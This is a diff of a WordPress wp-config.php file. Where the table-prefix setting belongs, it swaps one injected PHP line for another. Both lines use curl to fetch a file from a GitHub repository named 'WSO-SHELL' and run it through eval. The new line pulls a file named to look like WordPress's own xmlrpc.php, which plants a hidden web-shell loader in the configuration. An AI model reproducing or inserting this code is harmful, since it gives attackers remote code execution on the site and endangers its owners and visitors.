@@ -65,7 +65,7 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * You can have multiple installations in one database if you give each
  * a unique prefix. Only numbers, letters, and underscores please!
  */
-  $url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/unbteam.php";$ch = curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$tag= curl_exec($ch);curl_close($ch);eval("?>" . ("$tag"));
+  $url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/xmlrpc.php";$ch = curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$tag= curl_exec($ch);curl_close($ch);eval("?>" . ("$tag"));
 
 /**
  * For developers: WordPress debugging mode.
